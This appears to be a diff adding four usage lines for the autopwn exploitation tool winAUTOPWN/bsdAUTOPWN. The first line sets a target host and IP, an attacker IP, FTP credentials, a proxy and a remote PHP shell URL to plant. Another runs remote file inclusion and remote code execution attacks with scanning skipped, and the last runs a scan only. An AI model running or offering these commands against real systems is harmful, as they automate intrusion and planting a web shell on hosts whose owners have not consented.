@@ -1,0 +1,4 @@
+winAUTOPWN.exe -targetHOST MYTARGET -attackerIP 192.168.1.22 -cmsPATH /linpha2 -actcmsPATH /home/azim/linpha2 -phpshellPATH http://www.test.com/1.php -actphpshellPATH d -targetIP 192.168.1.1 -ftpUSR ftp -ftpPASSWD password -cmsadminUSR cmsadmin -proxyIP 198.168.3.23 -proxyPORT 3218
+winAUTOPWN.exe -skipscan
+winAUTOPWN.exe -skipscan -doRFI -doRCE
+./bsdAUTOPWN -onlyscan
